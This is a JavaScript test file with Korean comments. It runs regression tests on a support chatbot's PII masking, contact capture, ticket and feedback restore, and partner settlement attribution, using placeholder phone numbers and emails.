 * 들어 있었다(`[-\s.]`) — 가리는 쪽은 하이픈·공백만 알았다(`[-\s]`). 그래서 `010.1234.5678` 은
 * **고객의 연락처로 저장되는데 어느 자리에서도 가려지지 않는** 값이었다: 답변이 그 번호를
 * 그대로 되읽고(`contactTail`), 그 답변이 대화 기록·이관 요약·CSV·백업에 원문으로 남고,
 * 같은 규칙을 쓰는 `scrub` 를 지나 **서버 로그·오류 리포트·외부 LLM 호출 본문**까지 갔다.
 */
test('받아 적을 수 있는 전화번호 모양은 모두 가린다 (DS 52-1)', opts, async () => {
  process.env.ADMIN_PERSIST = 'false';
  delete process.env.CHAT_LLM_LIVE;
  const { maskPii, PHONE_MATCH_PATTERN } = await pickPii('pii');
  const { scrub } = await pickPii('monitoring');
  const { logTurn, resetLogs, listTurns } = await pickPii('convlog');
  const { extractContact, isOnlyContact, replyTo } = await pickPii('chat');

  // ── ① 종전 재현: 받아 적는 쪽은 점을 받아들였고, 가리는 쪽은 그 모양을 몰랐다.
  const dotted = '010.1234.5678';
  assert.equal(extractContact(dotted), dotted, '받아 적는 쪽이 이 모양을 받지 않는다 — 재현이 깨졌다');
  assert.equal(isOnlyContact(dotted), true, '연락처만 보낸 것으로 보지 않는다 — 재현이 깨졌다');
  assert.equal(/\b01[0-9][-\s]?\d{3,4}[-\s]?\d{4}\b/.test(dotted), false, '종전 가리는 규칙이 이 번호를 잡는다 — 재현 실패');

  // ── ② 이제 가린다 — 구분자가 무엇이든 **같은 모양**으로 적는다(화면·CSV 가 한 모양만 읽는다).
  for (const s of ['010-1234-5678', '010 1234 5678', '010.1234.5678', '01012345678']) {
    assert.equal(maskPii(s).text, '010-****-5678', `구분자에 따라 가린 모양이 달라진다: ${s}`);
    assert.deepEqual(maskPii(s).hits, ['phone'], s);
    assert.equal(maskPii(s, 'opaque').text, '01*-****-****', s);
  }
  // 지역번호도 받아 적는 모양이다(`0\d{1,2}…`) — 점 표기까지 함께 가린다.
  assert.equal(maskPii('02.123.4567').text, '02-****-4567');
  assert.equal(maskPii('02-123-4567').text, '02-****-4567');
  assert.equal(maskPii('031-123-4567').text, '031-****-4567');
  assert.equal(maskPii('02.123.4567', 'opaque').text, '0**-****-****');

  // ── ③ 받아 적는 쪽과 가리는 쪽이 **같은 글**을 쓴다 — 한 쪽만 넓어지는 일이 다시 없게.
  // 받아 적는 쪽이 실제로 쓰는 식(경계·관문 포함)으로 견준다 — 50차에 그 둘까지 한 벌이 되었다(DS 53-1).
  const shared = new RegExp(PHONE_MATCH_PATTERN);
  for (const s of ['010-1234-5678', '010 1234 5678', '010.1234.5678', '01012345678', '02-123-4567', '02.123.4567', '031-123-4567']) {
    assert.ok(shared.test(s), `공통 패턴이 받아 적는 모양을 놓친다: ${s}`);
    assert.equal(maskPii(s).masked, true, `받아 적을 수는 있는데 가리지 못한다: ${s}`);
  }

  // ── ④ 울타리를 넘는 자리 — 서버 로그·오류 리포트·외부 LLM 호출 본문이 같은 규칙을 쓴다.
  const outbound = scrub('연락처 010.1234.5678 / 매장 02.123.4567');
  assert.equal(outbound.includes('1234.5678'), false, '외부로 나가는 글에 번호가 그대로 실린다');
  assert.equal(outbound.includes('123.4567'), false, '외부로 나가는 글에 매장 번호가 그대로 실린다');

  // ── ⑤ 대화 기록도 같은 관문을 지난다(DS 39-1) — 저장된 글에 원문이 없다.
  resetLogs();
  logTurn({
    sessionId: 'rt-ds52-1', channel: 'web', tenant: null,
    message: '연락처는 010.1234.5678 이에요', reply: '네, 010.1234.5678 로 연락드릴게요',
    intent: 'agent', source: 'rule', escalate: false,
  });
  const kept = listTurns(1)[0];
  assert.equal(kept.message.includes('010.1234.5678'), false, '대화 기록에 고객의 번호가 원문으로 남는다');
  assert.equal(kept.reply.includes('010.1234.5678'), false, '챗봇 답변에 번호가 원문으로 남는다');
  assert.deepEqual(kept.piiKinds, ['phone'], '가린 종류가 남지 않으면 운영자는 누가 그렇게 쓴 것인지 모른다');
  resetLogs();

  // ── ⑥ 숫자로 시작하는 메일 주소를 반쪽으로 가르지 않는다(이메일 규칙에 넘긴다).
  assert.equal(maskPii('0212345678@example.com').text, '02***@example.com');
  assert.deepEqual(maskPii('0212345678@example.com').hits, ['email']);

  // ── ⑦ 끝단: 고객에게 **되읽는 문장**과 이관 요약에 원문이 없다.
  const sess = await pickPii('session');
  const esc = await pickPii('escalation');
  sess.resetSessions();
  esc.resetTickets();
  const sid = 'rt-ds52-dot';
  replyTo('상담원 연결해주세요', sid);
  replyTo(dotted, sid);
  const filed = esc.getTicket(sess.getSession(sid).ticketId);
  assert.equal(filed.contact, dotted, '연락처 칸은 가리지 않는다(상담원이 전화할 대상) — 전제가 깨졌다');
  assert.ok(filed.summary.includes('010-****-5678'), '이관 요약이 번호를 가리지 않는다');
  const again = replyTo('상담원', sid);
  assert.ok(again.reply.includes('010-****-5678'), '되읽는 문장이 번호를 가리지 않는다');
  assert.equal(again.reply.includes(dotted), false, '고객에게 되읽는 문장에 번호가 원문으로 나간다');
  esc.resetTickets();
  sess.resetSessions();
});

/**
 * DS 52-2 — 가린 글이 **규칙이 약속한 모양**이 아니었다.
 *
 * 가린다는 말은 ① 남겨야 하는 것만 남고 ② 받는 사람이 읽을 수 있는 한 가지 모양이라는 뜻이다.
 * 두 자리가 그 둘을 모두 어겼다. 이메일은 `m.slice(0, 2)` 가 `@` 까지 삼켜 `a@b.co` 를
 * `a@***@b.co` 로 적었고(`@` 가 두 번 찍힌 글), 아이디가 두 글자인 주소는 **한 글자도 가려지지
 * 않았다**. 계좌는 묶음이 넷인 번호를 앞 세 묶음만 보아 끝 두 자리를 남겼고(농협
 * `352-0123-4567-89`), 첫 묶음이 네 자리인 번호(신한 `1002-123-456789`)는 두 조각으로 갈려
 * 자리표시자가 두 벌 찍혔다 — 운영자는 계좌가 **둘** 적혀 있던 것으로 읽는다.
 */
test('가린 글이 규칙이 약속한 모양이다 (DS 52-2)', opts, async () => {
  const { maskPii } = await pickPii('pii');

  // ── ① 이메일: 종전 식 재현 — 앞 두 글자를 떼면 `@` 가 함께 떨어져 나온다.
  assert.equal('a@b.co'.slice(0, 2), 'a@', '종전 식이 재현되지 않는다');
  assert.equal(maskPii('a@b.co').text, '***@b.co', '아이디가 한 글자면 남길 것이 없다');
  assert.equal(maskPii('ab@b.co').text, 'a***@b.co', '아이디 두 글자가 통째로 남는다');
  // 멀쩡한 자리의 모양은 **한 글자도 바뀌지 않는다**.
  assert.equal(maskPii('abc@b.co').text, 'ab***@b.co');
  assert.equal(maskPii('hong.gildong@gowon.co.kr').text, 'ho***@gowon.co.kr');
  for (const s of ['a@b.co', 'ab@b.co', 'abc@b.co', 'hong.gildong@gowon.co.kr']) {
    const r = maskPii(s);
    assert.equal(r.text.split('@').length, 2, `가린 글에 @ 가 두 번 찍혔다: ${r.text}`);
    assert.ok(r.text.endsWith(`@${s.slice(s.lastIndexOf('@') + 1)}`), '도메인이 사라졌다 — 어디로 회신할지 알 수 없다');
    assert.deepEqual(r.hits, ['email'], s);
    // 아이디가 통째로 남지 않는다(남는 글자는 아이디보다 짧다).
    assert.ok(r.text.indexOf('***') < s.indexOf('@'), `아이디가 그대로 남았다: ${r.text}`);
  }

  // ── ② 계좌: 한 번호가 **한 벌로** 가려지고 끝자리가 남지 않는다.
  assert.equal(maskPii('1002-123-456789').text, '***-****-****', '한 계좌가 두 벌로 가려진다');
  assert.equal(maskPii('352-0123-4567-89').text, '***-****-****', '끝 두 자리가 그대로 남는다');
  // 멀쩡한 자리는 종전 그대로다(DS 39-3 이 세운 하이픈 없는 계좌 포함).
  for (const s of ['110-234-567890', '110-123-456789', '110212345678']) {
    assert.equal(maskPii(s).text, '***-****-****', s);
    assert.deepEqual(maskPii(s).hits, ['account'], s);
  }

  // ── ③ 날짜를 계좌로 읽지 않는다(DS 39-3 회귀) — 넓힌 규칙이 예약 일시를 삼키면 안 된다.
  const d = maskPii('예약 일시 2026-09-04 14:00, 연락처 010-1234-5678');
  assert.match(d.text, /2026-09-04 14:00/, '날짜는 원문 그대로 남아야 상담원이 일정을 안다');
  assert.equal(d.hits.includes('account'), false, '날짜를 계좌로 집계하면 통계가 틀어진다');
  assert.deepEqual(d.hits, ['phone']);
});

/**
 * DS 52-3 — 복원이 **끝난 접수의 연락처를 되살렸다.**
 *
 * 개인정보처리방침 4조는 「상담원 연결을 위한 연락처는 상담 완료 후 지체 없이 파기합니다」라고
 * 약속하고, 그 파기는 **상태가 바뀌는 순간에만** 일어난다(`updateTicket`). 파기 경로가 생긴
 * 것은 나중이라 그보다 앞서 뜬 저장분에는 **완료·취소인데 연락처가 그대로** 적힌 접수가 있고,
 * 그 접수에는 파기 시각도 없다 — 종전 복원 판정은 파기 시각이 적힌 접수만 보았으므로 아무 일도
 * 하지 않고 번호를 되살렸다. 되살아난 뒤에는 지울 길이 없다: 끝난 접수에 콘솔이 내주는 버튼은
 * 「다시 열기」뿐이고 그 길은 파기하지 않는다(운영자가 다시 열어 또 완료로 옮기지 않는 한).
 */
test('복원이 끝난 접수의 연락처를 되살리지 않는다 (DS 52-3)', opts, async () => {
  process.env.ADMIN_PERSIST = 'false';
  const esc = await pickPii('escalation');
  esc.resetTickets();
  const at = '2026-10-01T01:00:00.000Z';
  const row = (over) => ({
    sessionId: 'web_0123456789abcdef0123456789abcdef',
    reason: 'user_request', reasonCode: 'customer_request', message: '문의드려요',
    createdAt: '2026-10-01T00:00:00.000Z', updatedAt: at, ...over,
  });

  const r = esc.importTickets({
    version: 1, savedAt: at, seq: 4,
    tickets: [
      row({ id: 'ESC-0004', status: 'resolved', contact: '010-1111-2222' }),
      row({ id: 'ESC-0003', status: 'canceled', contact: '010-3333-4444' }),
      row({ id: 'ESC-0002', status: 'open', contact: '010-5555-6666' }),
      row({ id: 'ESC-0001', status: 'resolved' }),
    ],
  });
  assert.equal(r.ok, true);
  assert.equal(r.count, 4, '저장분을 건너뛰었다');

  // ── ① 끝난 접수의 연락처는 되살아나지 않고, **지웠다는 사실**이 남는다.
  for (const id of ['ESC-0004', 'ESC-0003']) {
    const t = esc.getTicket(id);
    assert.equal(t.contact, undefined, `${id}: 저장분을 읽어 들이자 끝난 접수의 연락처가 되살아났다`);
    assert.ok(t.contactPurgedAt, `${id}: 파기한 사실이 없어 화면이 「연락처 없음」이라 적는다`);
  }
  // ── ② 진행 중인 접수의 연락처는 그대로다 — 상담원이 전화할 곳을 지우지 않는다.
  assert.equal(esc.getTicket('ESC-0002').contact, '010-5555-6666', '진행 중인 접수의 연락처를 지웠다');
  assert.equal(esc.getTicket('ESC-0002').contactPurgedAt, undefined);
  // ── ③ 처음부터 연락처가 없던 접수는 「파기됨」이 아니다 — 다른 사실이라 화면이 달리 적는다.
  assert.equal(esc.getTicket('ESC-0001').contact, undefined);
  assert.equal(esc.getTicket('ESC-0001').contactPurgedAt, undefined, '받은 적 없는 번호를 파기했다고 말한다');

  // ── ④ 이미 파기 시각이 적힌 저장분은 **그 시각을 그대로** 들고 온다(지어내지 않는다).
  esc.resetTickets();
  const marked = '2026-09-30T05:00:00.000Z';
  esc.importTickets({
    version: 1, savedAt: at, seq: 1,
    tickets: [row({ id: 'ESC-0001', status: 'resolved', contact: '010-1111-2222', contactPurgedAt: marked })],
  });
  assert.equal(esc.getTicket('ESC-0001').contact, undefined, '파기 시각이 적혀 있는데 번호가 되살아났다');
  assert.equal(esc.getTicket('ESC-0001').contactPurgedAt, marked, '적혀 있던 파기 시각을 지금으로 덮었다');

  // ── ⑤ 「어느 상태가 끝인가」는 한 곳에서 정한다(DS 51-3) — 복원도 같은 자를 쓴다.
  assert.deepEqual(esc.CLOSED_STATUSES, ['resolved', 'canceled']);
  assert.equal(esc.isClosedStatus('open'), false);
  assert.equal(esc.isClosedStatus('in_progress'), false);
  esc.resetTickets();
});

/* ══════════ 53순위 — 백로그 소진 후 50차 재감사 (DS 53-1·53-2·53-3) ══════════ */

/**
 * DS 53-1 — 받아 적는 자와 가리는 자가 **같은 글을 다르게 읽었다**.
 *
 * 49차(DS 52-1)는 패턴 **속**(`PHONE_PATTERN`)을 한 벌로 만들었다. 그런데 가리는 쪽이 실제로
 * 쓰는 식에는 그 속을 감싸는 경계(`\b…\b`)와 관문(`(?![\w.+-]*@)`)이 더 있었고, 그 둘은 가리는
 * 쪽에만 남았다. 그래서 고객이 남긴 `0212345678@example.com` 을 받아 적는 쪽은 「전화번호
 * 0212345678」로, 가리는 쪽은 「이메일」로 읽었다 — 접수에 저장된 것은 **고객이 준 적 없는
 * 번호**이고, 이 경로의 답변은 저장한 값을 되읽지 않아 고칠 기회조차 없었다(상담원은 그
 * 번호로 전화한다 · DS 35-3 이 세운 「틀리게 적는 것보다 못 알아듣는 쪽이 낫다」 · §13).
 */
test('연락처는 가리는 쪽과 같은 자로 받아 적는다 (DS 53-1)', opts, async () => {
  process.env.ADMIN_PERSIST = 'false';
  delete process.env.CHAT_LLM_LIVE;
  const { maskPii, findContact, PHONE_MATCH_PATTERN } = await pickPii('pii');
  const { extractContact, isOnlyContact, replyTo } = await pickPii('chat');
  const { validateSlot, getForm, slotOf } = await pickPii('slots');
  const esc = await pickPii('escalation');

  // ── ① 종전 재현: 경계·관문이 없는 식은 메일 주소에서 「전화번호」를 떼어 간다.
  const legacy = new RegExp('0\\d{1,2}[-\\s.]?\\d{3,4}[-\\s.]?\\d{4}');
  assert.equal('0212345678@example.com'.match(legacy)?.[0], '0212345678', '종전 식이 재현되지 않는다');
  assert.equal('01012345678901'.match(legacy)?.[0], '01012345678', '종전 식이 긴 숫자를 자르지 않는다 — 재현 실패');
  // 같은 글을 가리는 쪽은 **다르게** 읽는다 — 두 쪽이 어긋나 있었다는 증거다.
  assert.deepEqual(maskPii('0212345678@example.com').hits, ['email'], '가리는 쪽도 전화번호로 읽는다 — 전제가 깨졌다');
  assert.deepEqual(maskPii('01012345678901').hits, ['account'], '가리는 쪽도 전화번호로 읽는다 — 전제가 깨졌다');

  // ── ② 이제 두 쪽이 같은 글을 쓴다 — 받아 적은 값은 **반드시 가려진다**.
  for (const s of ['010-1234-5678', '010 1234 5678', '010.1234.5678', '01012345678', '02-123-4567', '02.123.4567', '031-123-4567']) {
    assert.ok(new RegExp(PHONE_MATCH_PATTERN).test(s), `공통 식이 받아 적는 모양을 놓친다: ${s}`);
    const got = extractContact(s);
    assert.ok(got, `멀쩡한 번호를 받지 못한다: ${s}`);
    assert.equal(maskPii(got).masked, true, `받아 적을 수는 있는데 가리지 못한다: ${s}`);
    assert.deepEqual(maskPii(got).hits, ['phone'], `가린 종류가 전화번호가 아니다: ${s}`);
  }
  // 문장에 섞인 번호·둘을 함께 보낸 경우의 동작은 **한 글자도 바뀌지 않았다**.
  assert.equal(extractContact('연락처는 010-1234-5678 입니다'), '010-1234-5678');
  assert.equal(extractContact('010-1234-5678 / hong@gowon.co.kr'), '010-1234-5678', '전화번호를 먼저 고르던 동작이 바뀌었다');
  assert.equal(extractContact('010 1234 5678'), '01012345678', '공백 구분자를 지우던 동작이 바뀌었다');
  assert.equal(extractContact('hong@gowon.co.kr'), 'hong@gowon.co.kr');
  assert.equal(isOnlyContact('010.1234.5678'), true, '점으로 적은 번호를 더 이상 받지 않는다(DS 52-1 회귀)');

  // ── ③ 메일 주소는 **메일 주소로** 받는다 — 앞부분을 떼어 전화번호로 적지 않는다.
  for (const mail of ['0212345678@example.com', '01012345678@naver.com', '0101234567@naver.com']) {
    assert.equal(extractContact(mail), mail, `메일 주소에서 번호를 떼어 간다: ${mail}`);
    assert.equal(findContact(mail).kind, 'email', mail);
    assert.deepEqual(maskPii(extractContact(mail)).hits, ['email'], mail);
  }
  assert.equal(extractContact('제 메일은 0212345678@example.com 이에요'), '0212345678@example.com');

  // ── ④ 번호 모양이 더 긴 숫자에 묻혀 있으면 **잘라 적지 않는다** — 못 알아듣는 쪽이 낫다.
  for (const blob of ['01012345678901', '1234567890123', 'tel01012345678']) {
    assert.equal(extractContact(blob), null, `긴 숫자를 잘라 연락처로 적는다: ${blob}`);
  }

  // ── ⑤ 접수 폼의 연락처 칸도 **같은 자**를 쓴다(종전에는 세 번째 사본을 들고 있었다).
  const contactSlot = slotOf(getForm('reservation'), 'contact');
  assert.equal(validateSlot(contactSlot, '0212345678@example.com').value, '0212345678@example.com');
  assert.equal(validateSlot(contactSlot, '연락처는 010-1234-5678 입니다').value, '010-1234-5678');
  assert.equal(validateSlot(contactSlot, '01012345678901').ok, false, '폼이 긴 숫자를 잘라 받는다');
  assert.match(validateSlot(contactSlot, '01012345678901').message, /연락처 형식/, '왜 틀렸는지 말하지 않는다');

  // ── ⑥ 끝단: 서버가 물은 뒤 메일 주소를 보내면 **그 주소가** 접수에 붙고, 저장한 값을 되읽는다.
  esc.resetTickets();
  const captured = (() => {
    const sid = 'rt-ds53-1';
    replyTo('상담원 연결해 주세요', sid);
    return replyTo('0212345678@example.com', sid);
  })();
  assert.equal(esc.getTicket(captured.ticketId).contact, '0212345678@example.com', '고객이 주지 않은 번호가 접수에 적힌다');
  assert.ok(captured.reply.includes('02***@example.com'), '저장한 값을 되읽지 않아 고객이 고칠 수 없다');
  assert.equal(captured.reply.includes('0212345678@'), false, '되읽는 문장에 원문이 그대로 실린다');
  // 전화번호를 보낸 경우에도 같은 문장이다(0-a2 와 한 벌 · DS 34-2).
  const phoneTurn = (() => {
    const sid = 'rt-ds53-1b';
    replyTo('상담원 연결해 주세요', sid);
    return replyTo('010-1234-5678', sid);
  })();
  assert.ok(phoneTurn.reply.includes('010-****-5678'), '번호를 받아 적고도 무엇을 받았는지 말하지 않는다');
  assert.equal(esc.getTicket(phoneTurn.ticketId).contact, '010-1234-5678');
  esc.resetTickets();
});

/**
 * DS 53-2 — 「보완이 필요한 자료」의 이름을 **밖에서 적을 수 있었다**.
 *
 * 평가 창구(`/api/feedback`)는 인증이 없고, 근거 라벨은 「서버가 만들어 내려준 값이 그대로
 * 돌아온 것이다(자유 입력 아님)」라고 적혀 있었을 뿐 그것을 확인하는 자가 없었다. 저장된
 * 글은 관리 콘솔 대시보드 「보완이 필요한 자료」 줄에 **그대로** 그려지고(마스킹 관문도 지나지
 * 않는다) 백업 스냅샷으로 퍼진다. 게다가 지어낸 자료 id 는 「지워진 자료」 한 줄이 되어,
 * 있었던 적도 없는 자료를 운영자가 다시 등록하게 만든다 — 그 목록의 순서가 곧 운영자가 다음에
 * 할 일이다(DS 32-2·43-2).
 */
test('평가의 자료 이름은 서버가 지금 KB 에서 붙인다 (DS 53-2)', opts, async () => {
  process.env.ADMIN_PERSIST = 'false';
  const F = await importLib('feedback', ['storage', 'logger', 'monitoring', 'refusal']);
  const KB = { kb_refund: '환불·교환 규정 안내', eum_3: '이음 FAQ 3. 활동 시간' };

  // ── ① 종전 재현: 호출자가 적어 보낸 글이 그대로 저장되고 그대로 목록에 떴다.
  F.resetFeedback();
  const injected = '고객센터 010-1234-5678 로 전화주세요';
  assert.equal(F.recordFeedback({ sessionHash: 'h1', verdict: 'down', citation: injected }).entry.citation, injected,
    '저장소가 라벨을 받지 않는다 — 재현이 깨졌다');
  assert.equal(F.feedbackSummary(KB).topDown[0].citation, injected, '종전 식이 재현되지 않는다');

  // ── ② 가리는 자는 한 벌이다 — 지금 KB 에 있는 id 만 자료로 인정하고, **이름은 KB 에서** 온다.
  assert.deepEqual(F.resolveKb('kb_refund', KB), { kbId: 'kb_refund', citation: '환불·교환 규정 안내' });
  assert.deepEqual(F.resolveKb(' eum_3 ', KB), { kbId: 'eum_3', citation: '이음 FAQ 3. 활동 시간' });
  for (const made of ['kb_없는자료', 'x'.repeat(60), '', '   ', null, 42]) {
    assert.equal(F.resolveKb(made, KB), null, `지어낸 자료 id 를 받아들인다: ${JSON.stringify(made)}`);
  }

  // ── ③ 그 자를 지난 평가만 목록에 줄을 만든다 — 지어낸 id 는 「근거 없음」 한 줄로 모인다.
  F.resetFeedback();
  const send = (kbId) => {
    const kb = F.resolveKb(kbId, KB);
    return F.recordFeedback({ sessionHash: 'h', verdict: 'down', ...(kb ?? {}), channel: 'web' });
  };
  send('kb_refund');
  for (let i = 0; i < 5; i += 1) send(`made_up_${i}`);
  const s = F.feedbackSummary(KB);
  assert.equal(s.down, 6, '평가 수는 그대로 센다(버리지 않는다)');
  assert.equal(s.topDown.length, 2, '지어낸 id 가 목록에 줄을 만든다');
  assert.equal(s.topDown.filter((t) => t.citation === F.NO_CITATION_LABEL).length, 1, '지어낸 id 들이 한 줄로 모이지 않는다');
  assert.equal(s.topDown.some((t) => t.kbId && !KB[t.kbId]), false, '지금 KB 에 없는 id 가 저장됐다');
  assert.equal(s.topDown.find((t) => t.kbId === 'kb_refund').citation, '환불·교환 규정 안내');

  // ── ④ 저장분에 적혀 있던 이름은 **들고 오지 않는다** — 복원이 그 글을 되살리던 자리다.
  F.resetFeedback();
  const back = F.importFeedback({
    version: 1, savedAt: '', seq: 2,
    entries: [
      { id: 'F-000001', sessionHash: 'h', verdict: 'down', citation: injected, kbId: 'kb_refund', channel: 'web', at: '2026-10-20T00:00:00.000Z' },
      { id: 'F-000002', sessionHash: 'h', verdict: 'down', citation: injected, kbId: 'kb_gone', channel: 'web', at: '2026-10-20T00:00:00.000Z' },
    ],
  });
  assert.equal(back.ok, true);
  assert.equal(back.count, 2, '복원이 평가를 잃었다');
  assert.equal(F.listFeedback().some((e) => e.citation), false, '복원이 저장분의 이름을 되살린다');
  assert.equal(F.listFeedback()[0].kbId, 'kb_gone', '복원하면서 자료 id 를 잃는다');
  const after = F.feedbackSummary(KB);
  assert.equal(after.topDown.find((t) => t.kbId === 'kb_refund').citation, '환불·교환 규정 안내', '살아 있는 자료의 이름을 잃었다');
  const gone = after.topDown.find((t) => t.kbId === 'kb_gone');
  assert.equal(gone.missing, true, '지워진 자료를 지워졌다고 말하지 않는다');
  assert.equal(gone.citation, F.DELETED_KB_LABEL, '이름을 지어내거나 호출자의 글을 보여 준다');
  assert.notEqual(F.DELETED_KB_LABEL, F.NO_CITATION_LABEL, '「지워진 자료」와 「근거 없음」을 같은 말로 적는다');
  F.resetFeedback();
});

/**
 * DS 53-3 — 저장분을 되돌리면 **매출 귀속이 말없이 「직접 계약」으로** 바뀌었다.
 *
 * `@/lib/partners` 의 첫 원칙은 「귀속 변경은 append-only 이력으로 남긴다 — 값만 바꾸면 근거가
 * 사라진다」이고, `deletePartner` 는 연결된 고객사가 있는 파트너의 삭제를 거절한다. 그런데 복원
 * 경로는 「고아 귀속 방지」라며 가리키는 파트너가 저장분에 없는 고객사를 `partnerId: null` 로
 * 되돌렸다 — 이력은 한 줄도 남지 않고, 그 고객사의 `attribution` 은 여전히 그 파트너를 가리킨다.
 * 그리고 정산 리포트는 그 거짓을 **완전한 수**로 말했다: 「직접 계약 1건은 파트너 정산 대상이
 * 아니라 제외했습니다」 + `partial: false`. 파트너의 수수료가 아무 경고 없이 사라진다(§13).
 */
test('복원은 매출 귀속을 지우지 않고, 리포트가 그 사실을 말한다 (DS 53-3)', opts, async () => {
  process.env.ADMIN_PERSIST = 'false';
  const GROUP = ['settlement', 'partners', 'storage', 'logger', 'monitoring', 'csv', 'kst', 'normalize', 'refusal'];
  const pick = (name) => importLib(name, GROUP.filter((n) => n !== name));
  const P = await pick('partners');
  const S = await pick('settlement');
  const AT = new Date('2026-10-21T00:00:00Z');

  P.resetPartners();
  const ptr = P.upsertPartner({ name: '제이투모로우원', feeRateBp: 1500 }).partner;
  const acc = P.upsertAccount({
    name: '(주)고원', partnerId: ptr.id, source: 'partner',
    status: 'contracted', contractedAt: '2026-01-05', monthlyFeeKrw: 1000000,
  }).account;
  assert.equal(acc.attribution[acc.attribution.length - 1].toPartnerId, ptr.id);

  // 파트너 한 건의 이름이 빈 저장분 — 그 한 건은 건너뛴다(형식 위반). 고객사는 그대로 들어온다.
  const snap = P.exportPartners();
  const broken = { ...snap, partners: [{ ...snap.partners[0], name: '' }] };
  const r = P.importPartners(broken, { persist: false });
  assert.equal(r.ok, true);
  assert.equal(r.partners, 0, '이름 없는 파트너를 받아들인다 — 전제가 깨졌다');
  assert.equal(r.accounts, 1);

  // ── ① 귀속은 그대로다 — 값과 근거가 서로 다른 말을 하는 기록을 만들지 않는다.
  const kept = P.getAccount(acc.id);
  assert.equal(kept.partnerId, ptr.id, '복원이 매출 귀속을 지웠다');
  assert.equal(kept.source, 'partner', '복원이 유입 경로를 지웠다');
  assert.equal(kept.attribution.length, 1, '복원이 이력에 줄을 더했다(바뀐 것이 없다)');
  assert.equal(kept.attribution[0].toPartnerId, ptr.id, '이력과 값이 다른 말을 한다');
  // ── ② 조용히 넘기지 않는다 — 몇 건인지 말한다(라우트가 감사 로그·화면에 적는다).
  assert.equal(r.orphans, 1, '귀속 파트너를 찾을 수 없는 고객사 수를 말하지 않는다');

  // ── ③ 파트너별 집계가 그 고객사를 **떨어뜨리지 않는다** — 합이 고객사 수와 어긋나지 않게.
  const rows = P.rollupByPartner();
  assert.equal(rows.reduce((n, x) => n + x.total, 0), 1, '집계에서 고객사가 사라졌다');
  const orphanRow = rows.find((x) => x.partnerId === ptr.id);
  assert.ok(orphanRow, '찾을 수 없는 파트너의 줄이 없다');
  assert.equal(orphanRow.partnerName, P.missingPartnerName(ptr.id), '이름을 지어낸다');
  assert.equal(rows.find((x) => x.partnerId === null).total, 0, '직접 계약으로 세었다');

  // ── ④ 정산 리포트가 **빠진 까닭을 말한다** — 「직접 계약이라 대상이 아니다」가 아니다.
  const rep = S.buildSettlement({ month: '2026-02', at: AT });
  assert.equal(rep.ok, true);
  assert.equal(rep.report.rows.length, 1, '리포트에서 고객사가 사라졌다');
  assert.equal(rep.report.rows[0].partnerName, P.missingPartnerName(ptr.id));
  assert.equal(rep.report.rows[0].issue, 'no_fee_rate', '근거가 모자란 줄로 드러나지 않는다');
  assert.equal(rep.report.totals.incomplete, 1);
  assert.equal(rep.report.totals.partial, true, '합계가 일부만 반영됐는데 완전하다고 말한다');
  assert.equal(rep.report.notes.some((n) => n.includes('직접 계약')), false, '사실이 아닌 문장을 적는다');
  assert.ok(rep.report.notes.some((n) => n.includes('합계에서 제외')), '왜 빠졌는지 말하지 않는다');
  // 「지금 찾을 수 없는 파트너」의 이름은 한 벌이다 — 집계와 리포트가 같은 말을 쓴다.
  assert.equal(S.settlementToCsv(rep.report).includes(P.missingPartnerName(ptr.id)), true);

  // ── ⑤ 멀쩡한 저장분은 종전 그대로다(귀속도, 수수료도).
  const good = P.importPartners(snap, { persist: false });
  assert.equal(good.orphans, 0, '멀쩡한 저장분에 경고를 붙인다');
  const ok = S.buildSettlement({ month: '2026-02', at: AT });
  assert.equal(ok.report.rows[0].feeAmountKrw, 150000, '수수료 산출이 바뀌었다');
  assert.equal(ok.report.totals.partial, false);
  P.resetPartners();
});

/* ══════════ 디자인 스프린트 — 51차 재감사 (DS 54-1·54-2·54-3) ══════════ */

/**
 * DS 54-1 — 접수 복원이 **이관 요약·메모·연락처를 관문에 세우지 않았다.**
 *
 * 36차(DS 39-2)가 복원 경로에 마스킹 관문을 세웠는데, 그 관문을 지난 칸은 **접수 본문 하나**였다.
 * 나머지 칸은 `{...c}` 로 펼친 저장분 그대로였다 — 그 중 「이관 요약」은 상담원이 전화를 걸기 전에
 * **실제로 읽는 칸**이고(직전 대화 여섯 마디·수집한 슬롯이 들어 있다), 저장분이 적어 온 메모·
 * 연락처에는 길이 상한(DS 38-x)도, 글자인지 보는 자도 없었다.
 */
test('접수 복원이 요약·메모·연락처를 같은 관문에 세운다 (DS 54-1)', opts, async () => {
  process.env.ADMIN_PERSIST = 'false';
  const esc = await pickPii('escalation');
  const L = await importLib('limits');
  esc.resetTickets();
  const at = '2026-10-01T01:00:00.000Z';
  const raw = {
    id: 'ESC-0001',
    sessionId: 'web_0123456789abcdef0123456789abcdef',
    reason: 'user_request',
    reasonCode: 'customer_request',
    status: 'open',
    message: '배송이 안 와요',
    summary:
      '[상담원 이관 요약] 접수번호 ESC-0001 · 홈페이지 접수\n이관 사유: 고객이 상담원 연결을 요청\n'
      + '수집 정보\n  - 연락처: 010-1234-5678\n직전 대화\n  [고객] 010-1234-5678 로 전화주세요\n'
      + '개인정보 마스킹: 해당 없음',
    note: '메모'.repeat(400),
    contact: 'ㄱ'.repeat(400),
    createdAt: '2026-10-01T00:00:00.000Z',
    updatedAt: at,
    몰래끼운칸: '저장분이 적어 온 모르는 칸',
  };

  // ── ⓞ 종전 경로 재현: 저장분을 펼쳐 몇 칸만 덮는 식은 이 셋을 **그대로** 들고 온다.
  const legacy = { ...raw, message: '가린 본문' };
  assert.match(legacy.summary, /010-1234-5678/, '재현이 깨졌다 — 저장분의 요약에 원문이 없다');
  assert.ok(legacy.note.length > L.TICKET_NOTE_LEN, '재현이 깨졌다 — 메모가 상한을 넘지 않는다');
  assert.ok(legacy.contact.length > L.TICKET_CONTACT_LEN, '재현이 깨졌다 — 연락처가 상한을 넘지 않는다');

  const r = esc.importTickets({ version: 1, savedAt: at, seq: 1, tickets: [raw] });
  assert.equal(r.ok, true);
  assert.equal(r.count, 1, '멀쩡한 접수를 건너뛰었다');
  const t = esc.getTicket('ESC-0001');

  // ── ① 요약도 가려진다 — 상담원이 읽는 칸에 번호가 원문으로 남지 않는다.
  assert.equal(t.summary.includes('010-1234-5678'), false, '되살린 요약에 연락처 원문이 남았다');
  assert.match(t.summary, /010-\*\*\*\*-5678/, '가린 모양이 다른 자리와 다르다');
  assert.match(t.summary, /이관 사유: 고객이 상담원 연결을 요청/, '가리면서 멀쩡한 글까지 지웠다');
  // ② 가린 종류는 **우리가 센 값**이다 — 화면이 「가린 것이 있다」를 말할 수 있어야 한다.
  assert.deepEqual(t.piiKinds, ['phone'], '요약에서 가린 종류를 접수가 말하지 않는다');
